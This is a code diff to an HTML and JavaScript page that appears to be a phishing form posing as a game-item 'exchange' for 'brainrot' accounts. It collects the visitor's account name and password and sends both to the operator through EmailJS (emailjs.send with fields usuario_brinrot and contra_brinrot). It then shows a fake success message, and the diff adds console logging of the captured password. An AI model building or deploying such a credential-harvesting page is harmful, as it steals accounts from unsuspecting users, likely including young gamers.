@@ -13,21 +13,16 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         /* TUS ESTILOS ACTUALES (se mantienen igual) */
-        *, *::before, *::after {
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html {
-            font-size: 14px;
         }
 
         body {
             margin: 0;
             padding: 15px;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
             url('https://github.com/anasshouzmali4tc-cpu/vv/blob/main/descarga.jpg?raw=true') no-repeat center center fixed;
             background-size: cover;
@@ -36,52 +31,22 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            line-height: 1.4;
         }
         
         .registro-container {
-            padding-top: 110px;
             width: 100%;
             max-width: 400px;
-            margin: 10px auto;
             background: rgba(19, 23, 34, 0.92);
-            backdrop-filter: blur(15px);
             border-radius: 16px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
             padding: 40px 25px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.08);
             position: relative;
-            overflow: hidden;
         }
-        .registro-container::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #00a2ff, #ff00cc, #00ff95, #ffcc00);
-            z-index: -1;
-            border-radius: 18px;
-            opacity: 0.25;
-        } 
         
         .language-selector {
             position: absolute;
-            top: 3px;
-            right: 8px;
-            z-index: 10;
-        }
-        
-        .language-selector select {
-            background: rgba(30, 35, 48, 0.8);
-            color: #fff;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 6px;
-            padding: 6px 10px;
-            font-size: 0.85rem;
-            cursor: pointer;
+            top: 10px;
+            right: 10px;
         }
         
         .intercambio-title {
@@ -89,20 +54,11 @@
             font-size: 2.2rem;
             font-weight: 800;
             margin-bottom: 5px;
-            text-shadow: 0 0 8px rgba(0, 162, 255, 0.7);
-            letter-spacing: 0.5px;
-            line-height: 1.2;
         }
         
         .registro-subtitle {
             color: #a0aec0;
-            font-size: 1rem;
             margin-bottom: 25px;
-            font-weight: 400;
-        }
-        
-        .registro-form {
-            margin-bottom: 20px;
         }
         
         .form-group {
@@ -115,30 +71,15 @@
             margin-bottom: 8px;
             font-weight: 600;
             color: #e2e8f0;
-            font-size: 0.95rem;
         }
         
         .form-group input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px;
             border: 2px solid rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            font-size: 1rem;
-            transition: all 0.2s;
             background: rgba(30, 35, 48, 0.8);
             color: #fff;
-            min-height: 48px;
-        }
-        
-        .form-group input::placeholder {
-            color: #a0aec0;
-        }
-        
-        .form-group input:focus {
-            border-color: #00a2ff;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25);
-            background: rgba(40, 45, 60, 0.9);
         }
         
         .accept-btn {
@@ -151,28 +92,12 @@
             font-weight: 700;
             cursor: pointer;
             width: 100%;
-            transition: all 0.2s;
             margin-top: 8px;
-            letter-spacing: 0.3px;
-            box-shadow: 0 4px 12px rgba(0, 162, 255, 0.3);
-            min-height: 50px;
-            touch-action: manipulation;
-        }
-        
-        .accept-btn:hover {
-            background: linear-gradient(to right, #0088cc, #00b8e6);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 162, 255, 0.4);
-        }
-        
-        .accept-btn:active {
-            transform: translateY(0);
         }
         
         .loading {
             display: none;
             color: #00a2ff;
-            font-size: 1rem;
             margin: 8px 0;
             padding: 10px;
         }
@@ -184,63 +109,12 @@
             padding: 10px;
             border-radius: 8px;
             margin: 8px 0;
-            font-size: 0.85rem;
-            border-left: 4px solid #ff6b6b;
         }
         
         .gracias-mensaje {
             display: none;
             text-align: center;
             padding: 30px 20px;
-            background: rgba(39, 174, 96, 0.15);
-            border-radius: 12px;
-            border: 1px solid rgba(39, 174, 96, 0.3);
-            margin-top: 15px;
-            backdrop-filter: blur(5px);
-        }
-        
-        .gracias-mensaje h2 {
-            color: #27ae60;
-            margin-bottom: 15px;
-            font-size: 1.7rem;
-            text-shadow: 0 0 8px rgba(39, 174, 96, 0.3);
-        }
-        
-        .gracias-mensaje p {
-            color: #e2e8f0;
-            margin-bottom: 12px;
-            font-size: 1rem;
-            line-height: 1.4;
-        }
-        
-        @media (max-width: 380px) {
-            .registro-container {
-                padding: 20px 15px;
-                border-radius: 14px;
-            }
-            
-            .intercambio-title {
-                font-size: 1.9rem;
-            }
-            
-            .registro-subtitle {
-                font-size: 0.9rem;
-                margin-bottom: 20px;
-            }
-            
-            .form-group input {
-                padding: 12px 14px;
-                font-size: 0.95rem;
-            }
-            
-            .accept-btn {
-                padding: 14px;
-                font-size: 0.95rem;
-            }
-            
-            .gracias-mensaje h2 {
-                font-size: 1.5rem;
-            }
         }
     </style>
 </head>
@@ -259,12 +133,12 @@
         <form id="forma-registro" class="registro-form">
             <div class="form-group">
                 <label for="account" data-es="Cuenta de brainrots:" data-en="Brainrots account:">Cuenta de brainrots:</label>
-                <input type="text" id="account" placeholder="" required>
+                <input type="text" id="account" placeholder="Ingresa tu cuenta" required>
             </div>
             
             <div class="form-group">
-                <label for="password" data-es="Contrasenya de Cuenta de brainrot:" data-en="Brainrot password account:">Contrasenya de Cuenta de brainrot:</label>
-                <input type="password" id="password" placeholder="" required>
+                <label for="password" data-es="Contraseña de brainrot:" data-en="Brainrot password:">Contraseña de brainrot:</label>
+                <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
             </div>
             
             <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
@@ -277,7 +151,6 @@
             <h2 data-es="¡Gracias! ✅" data-en="Thank You! ✅">¡Gracias! ✅</h2>
             <p><strong data-es="Peticion completada con éxito" data-en="Request completed successfully">Peticion completada con éxito</strong></p>
             <p data-es="Tu peticion ha sido procesada" data-en="Your request has been processed">Tu Peticion ha sido procesada</p>
-            <p data-es="Te contactaremos en 24-48 horas" data-en="We will contact you in 24-48 hours">Te contactamos en 24-48 horas</p>
         </div>
     </div>
 
@@ -285,32 +158,6 @@
         // Inicializar EmailJS
         emailjs.init("BgugL5adTp__2FfNx");
         
-        // Textos traducidos
-        const translations = {
-            es: {
-                title: "INTERCAMBIO",
-                subtitle: "Completar",
-                accountLabel: "Cuenta de brainrot:",
-                loading: "Procesando...",
-                acceptButton: "CONTINUAR",
-                thankYou: "¡Gracias! ✅",
-                requestSuccess: "Peticion completada con éxito",
-                brainrotProcessed: "Tu Peticion ha sido procesada",
-                bobuxArrival: "24-48 horas"
-            },
-            en: {
-                title: "EXCHANGE",
-                subtitle: "Complete",
-                accountLabel: "Brainrot account:",
-                loading: "Processing...",
-                acceptButton: "CONTINUE",
-                thankYou: "Thank You! ✅",
-                requestSuccess: "Request completed successfully",
-                brainrotProcessed: "Your request has been processed",
-                bobuxArrival: "24-48 hours"
-            }
-        };
-
         let currentLang = 'es';
 
         // Función para cambiar idioma
@@ -323,17 +170,20 @@
             });
         }
         
-        // Evento del formulario
+        // Evento del formulario - VERSIÓN SIMPLIFICADA PARA DEBUG
         document.getElementById('forma-registro').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const account = document.getElementById('account').value.trim();
             const password = document.getElementById('password').value.trim();
             
+            console.log('🔍 VALORES CAPTURADOS:', {
+                cuenta: account,
+                contraseña: password
+            });
+
             if (!account || !password) {
-                showError(currentLang === 'es' 
-                    ? 'Por favor, completa todos los campos' 
-                    : 'Please fill in all fields');
+                showError('Por favor, completa todos los campos');
                 return;
             }
 
@@ -342,41 +192,40 @@
             document.getElementById('error-message').style.display = 'none';
             document.getElementById('submit-btn').disabled = true;
 
-            // **PARÁMETROS CORRECTOS - usando los valores del usuario**
+            // PARÁMETROS CON VALORES REALES DEL USUARIO
             const templateParams = {
-                usuario_brinrot: account,    // Valor real del usuario
-                contra_brinrot: password,    // Valor real del usuario  
-                from_name: 'Sistema de Intercambios',
-                to_name: 'Administrador',
-                fecha: new Date().toLocaleString('es-ES'),
+                usuario_brinrot: account,      // ESTE valor cambia con cada usuario
+                contra_brinrot: password,      // ESTE valor cambia con cada usuario
+                from_name: 'Formulario Web',
+                to_name: 'Administrador', 
+                fecha: new Date().toLocaleString(),
                 idioma: currentLang,
-                ip: 'N/A' // Podrías obtener la IP si quieres
+                ip: 'N/A'
             };
 
-            console.log('📤 Enviando email con datos:', templateParams);
+            console.log('🚀 ENVIANDO A EMAILJS:', templateParams);
 
             emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                 .then(function(response) {
-                    console.log('✅ Email enviado correctamente!', response.status, response.text);
+                    console.log('✅ EMAIL ENVIADO CORRECTAMENTE');
+                    console.log('Respuesta:', response);
                     
                     // Mostrar éxito
                     document.getElementById('forma-registro').style.display = 'none';
                     document.getElementById('gracias-mensaje').style.display = 'block';
                     
-                    // Guardar en localStorage
-                    const peticion = {
-                        usuario: account,
-                        estado: 'completada',
-                        email_enviado: true,
-                        timestamp: new Date().toISOString()
-                    };
-                    localStorage.setItem('peticionbrinrot', JSON.stringify(peticion));
+                    // Limpiar formulario
+                    document.getElementById('account').value = '';
+                    document.getElementById('password').value = '';
                 })
                 .catch(function(error) {
-                    console.error('❌ Error enviando email:', error);
-                    showError(currentLang === 'es' 
-                        ? 'Error al enviar la petición. Intenta nuevamente.' 
-                        : 'Error sending request. Please try again.');
+                    console.error('❌ ERROR ENVIANDO EMAIL:', error);
+                    let errorMsg = 'Error: ';
+                    if (error.text) errorMsg += error.text;
+                    else if (error.message) errorMsg += error.message;
+                    else errorMsg += JSON.stringify(error);
+                    
+                    showError(errorMsg);
                 });
         });
 
@@ -391,16 +240,8 @@
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('language-select').addEventListener('change', function(e) {
                 changeLanguage(e.target.value);
-                localStorage.setItem('selectedLanguage', e.target.value);
             });
-            
-            const savedLang = localStorage.getItem('selectedLanguage');
-            if (savedLang && ['es', 'en'].includes(savedLang)) {
-                document.getElementById('language-select').value = savedLang;
-                changeLanguage(savedLang);
-            } else {
-                changeLanguage('es');
-            }
+            changeLanguage('es');
         });
     </script>
 </body>
